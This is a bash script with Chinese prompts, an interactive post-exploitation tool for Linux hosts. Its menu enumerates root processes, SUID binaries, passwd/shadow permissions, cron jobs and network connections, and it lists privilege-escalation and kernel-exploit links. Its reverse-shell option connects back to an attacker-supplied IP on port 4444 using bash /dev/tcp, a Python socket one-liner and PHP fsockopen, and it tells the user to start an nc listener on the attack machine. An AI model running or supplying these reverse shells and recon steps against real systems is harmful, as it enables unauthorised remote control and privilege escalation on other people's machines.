#!/bin/bash

echo "A B C D E F G H I J K L N M"
jiet(){
	echo "是否查询执行[1]/[2]"
	read gsrc
	if test $gsrc  -eq "1"
	then
		clear
		runs
	elif test ${#gsrc} -eq "0"
	then
		clear
		runs

	else
		echo "[!] 退出...."
		exit 0	
	fi
}

fshell(){
	echo "[1]NC反弹shell"
	echo "[2]python反弹shell"
	echo "[3]PHP反弹shell"
	read input
	if test $input -eq "1"
	then
		echo "在攻击机执行nc -lvp 4444"
		echo "输入攻击机的IP"
		read host
		bash -i >& /dev/tcp/$host/4444 0>&1
	elif test $input -eq "2"
	then
		echo "在攻击机执行nc -lvp 4444"
		echo "输入攻击机IP"
		read host
		python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$host',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
	
	elif test $input -eq "3"
	then

		echo "在攻击机执行nc -lvp 4444"
		echo "输入攻击机IP"
		read host
		php -r '$sock=fsockopen("'$host'",4444);exec("/bin/bash -i 0>&3 1>&3 2>&3");'
	fi
}

runs(){
	wen_array=("https://www.cnblogs.com/linuxsec/articles/6080882.html" "https://guif.re/linuxeop" "https://www.ddosi.com/l/" "https://github.com/SecWiki/linux-kernel-exploits--Linux提权exp下载" "https:/	      	/shenaniganslabs.io/2019/02/13/Dirty-Sock.html" "https://www.secquan.org/Discuss/1069715" "https://www.cnblogs.com/hookjoy/p/6612595.html")
	echo "[1] 查看系统基本架构和信息"
	echo "[2] 本机IP查询"
	echo "[3] 列出以root权限运行的进程"
	echo "[4] 寻找系统里可以用的SUID文件"
	echo "[5] 查看系统环境变量"
	echo "[6] 查看/etc/passwd文件权限和/etc/shadow文件权限"
	echo "[7] 计划任务"
	echo "[8] 查看网络信息"
	echo "[9] 一些不错的提权文章"
	echo "[10] 反弹shell"
	echo "[11] 退出"

	read sum
	if test $sum -eq "1"
	then
		echo "---系统版本信息---"
		uname -a
		echo "---系统架构---"
		lsb_release -a
		echo "---系统版本---"
		cat /proc/version
		jiet
	elif test $sum -eq "2"
	then
		echo "---本机IP信息---"
		ifconfig
		jiet
	elif test $sum -eq "3"
	then
		echo "---以root权限运行的进程---"
		ps -fu root
		jiet
	elif test $sum -eq "4"
	then
		echo "---可用的SUID文件---"
		find / -perm -u=s -type f 2>/dev/null
		jiet	
	elif test $sum -eq "5"
	then
		echo "---PATH---"
		echo $PATH
		jiet
	elif test $sum -eq "6"
	then
		echo "---passwd&&shadow"
		ls -l /etc | grep passwd
		ls -l /etc | grep shadow
		jiet
	elif test $sum -eq "7"
	then
		echo "---/etc内的计划任务---"
		ls -l /etc/cron*
		jiet
	elif test $sum -eq "8"
	then
		echo "---网络信息---"
		netstat -antup
		jiet

	elif test $sum -eq "9"
	then
		echo "---文章链接---"
		for((i=0;i<${#wen_array[*]};i++)) do
			echo ${wen_array[i]}
		done
		jiet
	elif test $sum -eq "10"
	then
		echo "---反弹shell---"
		fshell
		jiet
	elif test $sum -eq "11"
	then
		echo "Bye"
		exit 0
	fi
}
runs
